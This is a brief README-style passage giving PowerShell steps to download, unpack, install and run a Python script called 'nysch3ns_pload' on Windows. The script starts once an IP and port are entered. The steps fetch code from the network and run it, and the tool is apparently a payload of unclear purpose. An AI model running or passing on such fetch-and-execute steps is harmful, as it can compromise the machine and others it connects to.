>>Script automatically starts after putting correct IP and PORT!
>>Run it on WINDOWS!
>>Python has to be installed on PC

POWERSHELL INSTALLATION:

curl -o nysch3ns_pload.zip https://github.com/nysch3n/nysch3ns_pload/archive/refs/heads/main.zip

Expand-Archive .\nysch3ns_pload.zip

cd nysch3ns_pload\nysch3ns_pload-main

cmd

pip install -r requirements.txt

python3 nysch3ns_pload.py
